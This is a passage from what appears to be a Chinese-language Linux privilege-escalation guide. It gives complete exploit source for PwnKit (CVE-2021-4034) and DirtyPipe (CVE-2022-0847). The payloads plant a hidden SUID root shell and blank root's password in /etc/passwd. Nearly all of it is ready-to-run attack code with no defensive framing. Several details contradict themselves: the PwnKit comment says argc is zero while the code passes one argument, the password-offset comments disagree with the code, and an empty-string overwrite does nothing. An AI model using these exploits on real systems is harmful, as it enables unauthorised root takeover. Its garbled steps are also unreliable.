## 1.2 PwnKit — CVE-2021-4034(即时 root)

影响:所有主流发行版自 2009 年起默认安装的 polkit `pkexec`(Ubuntu、Debian、RHEL/CentOS、Fedora、Arch、openSUSE)。

```c
/* pwnkit.c — CVE-2021-4034 local root
 * gcc pwnkit.c -o pwnkit && ./pwnkit
 *
 * 原理:pkexec 在 argc 处理上越界读/写 argv[1]。当 execve 传入
 * argv[0]=NULL(argc=0) 时,argv[1] 在栈上正好落在 envp[0]。
 * pkexec 会把解析出的路径写回 argv[1],从而在它已经清洗环境变量
 * 之后,把 GCONV_PATH 重新注入回进程环境。
 * 随后 glibc 的 gconv 机制加载我们放在该路径下的恶意 .so,
 * 其 gconv_init() 以 euid 0 执行。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#define BIN  "/usr/bin/pkexec"
#define ROOT "GCONV_PATH=."          /* 目录名字面量就叫 "GCONV_PATH=." */

static void wf(const char *p, const char *s, mode_t m) {
    int fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, m);
    if (fd < 0) { perror(p); exit(1); }
    write(fd, s, strlen(s));
    close(fd);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("[*] CVE-2021-4034 (PwnKit)");

    if (access(BIN, X_OK) != 0) { puts("[-] /usr/bin/pkexec 不存在"); return 1; }

    /* 1) 目录结构:GCONV_PATH=. 内含 gconv-modules,指向 pwnkit */
    mkdir(ROOT, 0755);
    mkdir(ROOT "/gconv", 0755);

    /* 2) 恶意 gconv 模块:以 root 身份落地一个 suid shell 再起交互壳 */
    wf(ROOT "/gconv/pwnkit.c",
       "#include <stdio.h>\n"
       "#include <stdlib.h>\n"
       "#include <unistd.h>\n"
       "void gconv(void){}\n"
       "void gconv_init(void){\n"
       "    setuid(0); setgid(0); seteuid(0); setegid(0);\n"
       "    setenv(\"PATH\",\"/bin:/usr/bin:/sbin:/usr/sbin\",1);\n"
       "    system(\"cp /bin/sh /tmp/.0x 2>/dev/null; chmod 4755 /tmp/.0x 2>/dev/null;\");\n"
       "    char *a[]={\"/bin/sh\",\"-p\",\"-i\",NULL};\n"
       "    execv(\"/bin/sh\",a);\n"
       "    _exit(0);\n"
       "}\n", 0644);

    /* 3) 编译模块 */
    if (system("gcc -shared -fPIC -w " ROOT "/gconv/pwnkit.c "
               "-o " ROOT "/gconv/pwnkit.so 2>/dev/null") != 0) {
        if (system("cc -shared -fPIC -w " ROOT "/gconv/pwnkit.c "
                   "-o " ROOT "/gconv/pwnkit.so 2>/dev/null") != 0) {
            puts("[-] 无编译器,先 apt install build-essential / yum install gcc");
            return 1;
        }
    }

    /* 4) gconv-modules:声明 UTF-8 -> PWNKIT 转换,模块名 pwnkit */
    wf(ROOT "/gconv/gconv-modules",
       "module  UTF-8//    PWNKIT//    pwnkit    1\n", 0644);

    /* 5) 触发:argv 长度为 1(NULL 结尾),envp[0] 放进 GCONV_PATH */
    char *argv[] = { "pkexec", NULL };
    char *envp[] = {
        "GCONV_PATH=.",              /* 被越界写重定向到 . */
        "PATH=GCONV_PATH=.",
        "SHELL=pwnkit",
        "CHARSET=PWNKIT",
        NULL
    };

    execve(BIN, argv, envp);
    perror("execve");
    return 1;
}
```

关键点:
- 目录名必须是字面量 `GCONV_PATH=.`(相对路径有效)。
- `gconv_init()` 里先 `setuid(0)` 再 `execv`,否则会用真 uid 执行。
- 备选载荷:`system("chmod u+s /bin/bash")` → 之后 `bash -p`。

## 1.3 DirtyPipe — CVE-2022-0847(root)

影响:Linux 内核 5.8 – 5.16.4(含 5.15.x LTS)、5.16.x、以及被 backport 的 5.10.x(如 Debian 11 `<5.10.106`)。无需竞态,稳定。

```c
/* dirtypipe.c — CVE-2022-0847 任意只读文件页缓存覆写
 * gcc dirtypipe.c -o dirtypipe && ./dirtypipe <目标文件> <偏移> <新数据>
 *
 * 利用点:pipe 的 page cache 在 splice 后残留 PIPE_BUF_FLAG_CAN_MERGE,
 * 使 write() 直接改写只读页。不能跨页、不能改页首一个字节、不能增大文件。
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    /* 灌满 pipe,每个 pipe_buffer 获得 CAN_MERGE 标志 */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    /* 排空,释放 buffer 但保留标志 */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "用法: %s <SUID/只读文件> <偏移> <数据>\n", argv[0]);
        return 1;
    }
    const char *path = argv[1];
    loff_t offset   = strtoul(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    if (offset % PAGE_SIZE == 0) { fprintf(stderr, "偏移不能是页边界\n"); return 1; }
    loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page) { fprintf(stderr, "不能跨页\n"); return 1; }

    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    if (fstat(fd, &st)) { perror("fstat"); return 1; }
    if (offset > st.st_size || end_offset > st.st_size) {
        fprintf(stderr, "越界或会增大文件\n"); return 1;
    }

    int p[2];
    prepare_pipe(p);

    --offset;                                  /* 从目标前一个字节 splice */
    ssize_t n = splice(fd, &offset, p[1], NULL, 1, 0);
    if (n <= 0) { perror("splice"); return 1; }

    n = write(p[1], data, data_size);          /* 写穿页缓存 */
    if (n < (ssize_t)data_size) { perror("write"); return 1; }

    puts("[+] 页缓存已覆写");
    return 0;
}
```

拿 root 的载荷(不改磁盘,login 直接读内存页):

```bash
# 1) 备份并定位 /etc/passwd 中 root 行的 "x" 偏移
cp /etc/passwd /tmp/passwd.bak
grep -abo '^root:x:' /etc/passwd          # 输出形如 0:root:x:
# 偏移 = 上面冒号前的数字 + 6(root:x 的长度),把 'x' 改成空
off=$(( $(grep -abo 'root:x:' /etc/passwd | cut -d: -f1) + 5 ))

# 2) 用空密码覆盖 'x'
./dirtypipe /etc/passwd $off ""            # 注意跨页限制,偏移须在同页内
# 3) 直接切换
su root                                    # 空密码 → root
```

